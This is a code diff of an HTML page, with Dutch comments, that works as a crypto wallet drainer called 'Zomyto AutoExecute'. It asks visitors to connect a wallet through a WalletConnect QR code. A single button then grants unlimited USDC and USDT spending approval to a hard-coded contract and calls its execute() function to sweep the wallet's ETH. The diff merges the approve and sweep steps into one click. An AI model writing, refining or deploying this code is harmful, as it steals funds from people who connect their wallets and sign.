@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zomyto AutoExecute Approve + Sweep ETH</title>
+<title>Zomyto AutoExecute - Approve + Sweep ETH</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 <style>
@@ -20,11 +20,11 @@
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://scan.walletconnect.com/?clientMeta.name=Zomyto&projectId=0e7d96df89f873ddfb0b4381e13c883c" alt="Scan QR to connect">
 
 <button id="connect">Connect Wallet</button>
-<button id="approve" disabled>Approve USDC & USDT</button>
-<button id="sweepEth" disabled>Sweep ETH</button>
+<button id="approveAndSweep" disabled>Approve USDC & USDT + Sweep ETH</button>
 
 <script>
-let provider; let signer;
+let provider; 
+let signer;
 
 // ERC20 tokens
 const tokens = [
@@ -32,59 +32,51 @@ const tokens = [
   {name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7"}
 ];
 
-// AutoExecute contract
-const autoExecuteContract = "0xJouwAutoExecuteContractAdres"; // vervang dit
+// AutoExecute contract adres
+const autoExecuteContract = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A"; // vervang dit door jouw contractadres
 
+// ABIs
 const tokenABI = [
   "function approve(address spender, uint256 amount) public returns (bool)"
 ];
 
 const autoExecuteABI = [
-  "function execute() external",
-  "function executeToken(address _token) external"
+  "function execute() external"
 ];
 
-// Connect Wallet
+// Connect wallet
 document.getElementById("connect").onclick = async () => {
   const wcProvider = new WalletConnectProvider.default({projectId:"0e7d96df89f873ddfb0b4381e13c883c"});
   await wcProvider.enable();
   provider = new ethers.providers.Web3Provider(wcProvider);
   signer = provider.getSigner();
-  document.getElementById("approve").disabled = false;
-  document.getElementById("sweepEth").disabled = false;
+  document.getElementById("approveAndSweep").disabled = false;
   alert("Wallet connected!");
 };
 
-// Approve multiple tokens
-document.getElementById("approve").onclick = async () => {
-  for (let t of tokens) {
-    try {
+// Approve + Sweep ETH
+document.getElementById("approveAndSweep").onclick = async () => {
+  try {
+    // 1️⃣ Approve alle tokens
+    for (let t of tokens) {
       const token = new ethers.Contract(t.address, tokenABI, signer);
-      const tx = await token.approve("0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A", ethers.constants.MaxUint256);
+      const tx = await token.approve(autoExecuteContract, ethers.constants.MaxUint256);
       await tx.wait();
       console.log(`✅ Approved ${t.name}`);
-    } catch(e) {
-      console.error(`❌ Fout bij ${t.name}: ${e.message}`);
-      alert(`Fout bij ${t.name}: ${e.message}`);
     }
-  }
-  alert("✅ USDC & USDT succesvol goedgekeurd!");
-};
 
-// Sweep ETH via AutoExecute contract
-document.getElementById("sweepEth").onclick = async () => {
-  try {
-    const contract = new ethers.Contract("0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A", autoExecuteABI, signer);
-    const tx = await contract.execute();
-    await tx.wait();
-    alert("✅ ETH succesvol geswept via AutoExecute!");
+    // 2️⃣ Sweep ETH
+    const contract = new ethers.Contract(autoExecuteContract, autoExecuteABI, signer);
+    const tx2 = await contract.execute();
+    await tx2.wait();
+
+    alert("✅ USDC & USDT goedgekeurd en ETH succesvol geswept!");
   } catch(e) {
-    console.error(`❌ Sweep ETH fout: ${e.message}`);
-    alert(`Fout bij Sweep ETH: ${e.message}`);
+    console.error(`❌ Fout: ${e.message}`);
+    alert(`Fout tijdens approve of sweep: ${e.message}`);
   }
 };
 </script>
 
 </body>
 </html>
-
